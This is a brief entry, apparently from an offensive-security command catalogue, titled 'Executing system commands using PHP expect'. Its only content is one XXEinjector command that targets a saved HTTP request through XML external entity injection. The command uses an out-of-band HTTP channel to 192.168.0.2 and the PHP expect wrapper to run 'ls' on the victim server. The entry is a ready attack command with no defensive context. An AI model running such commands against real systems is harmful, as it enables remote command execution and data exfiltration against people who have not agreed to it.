---
id: bc9b9bf3-690f-4bf0-9a6a-ed3551e975ce
name: Executing system commands using PHP expect
type: command
executor: bash
data: ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter
  --expect=ls
output: null
created_at: '2023-04-06T03:56:43.973769+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
---

# Executing system commands using PHP expect

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
```


